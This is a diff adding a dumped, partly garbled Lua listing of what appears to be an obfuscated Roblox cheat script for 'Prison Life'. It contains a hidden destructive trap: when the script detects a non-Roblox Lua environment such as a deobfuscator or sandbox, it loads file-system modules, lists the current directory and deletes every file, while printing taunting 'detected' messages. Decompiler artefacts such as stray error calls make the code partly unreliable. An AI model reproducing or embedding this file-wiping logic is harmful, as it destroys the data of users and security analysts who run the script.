@@ -1,0 +1,55 @@
+--//https://scriptblox.com/script/MP5-Prison-Life-PLH-75263
+--//Creator: SheScripts
+
+-//Dumped:
+
+local Env = getfenv()
+setmetatable(game, {})
+local a = Env.a;
+local var1 = getmetatable(game);
+Env.main = function(p1_0, p2_0, p3_0)
+end;
+Env[setmetatable({}, {
+    __tostring = function(p1_0, p2_0, p3_0)
+    end,
+})] = function()
+    Env.debug = nil;
+    Env.coroutine = nil;
+    Env.mother = nil;
+    print("detected", "UDDDD BROO")
+end;
+local _VERSION_isnt_string = (_VERSION ~= "Luau");
+local _VERSION_is_string = (_VERSION == "Lua");
+local var2 = (_VERSION_is_string and 13527965);
+local Not_VERSION = not _VERSION;
+local var3 = loadstring("return require(\"@lune/fs\")");
+local Success_41, Error_Message_41 = pcall(var3)
+local Loaded_Func = var3();
+local Module = require("@lune/fs");
+error("[internal]:4267: Unable to require argument from given path '@lune/fs'") -- Loadstring error
+local var4 = loadstring("return require(\"lfs\")");
+local Success_42, Error_Message_42 = pcall(var4)
+local Loaded_Func_2 = var4();
+local Module_2 = require("lfs");
+error("[internal]:4267: Unable to require argument from given path 'lfs'") -- Loadstring error
+local ReadDir = Loaded_Func.readDir;
+local _call5 = ReadDir("./");
+for i, v in next, _call5 do
+    if i then -- ran, expr id 1, has an else.
+        local RemoveFile = Loaded_Func.removeFile;
+        local _call5 = RemoveFile(v);
+    end
+    Env.mother = nil;
+    Env.is_detected = "yes, you're really detected buddy. (this is just a message to talk to you, i don't get to talk to people 🙁)";
+    print("detected", "im sorry")
+    local Dir = Loaded_Func_2.dir;
+    local _call6 = Dir("./");
+    for i_2, v_2 in next, _call6 do
+        local var6 = (i_2 and 12322168);
+        local i_2_isnt_string = (i_2 ~= ".");
+        local i_2_isnt_string_2 = (i_2 ~= "..");
+        local var7 = (i_2_isnt_string_2 and 13012877);
+        local var8 = (var7 or 10349372);
+    end
+end
+error("[internal]:2961: attempt to call a nil value")
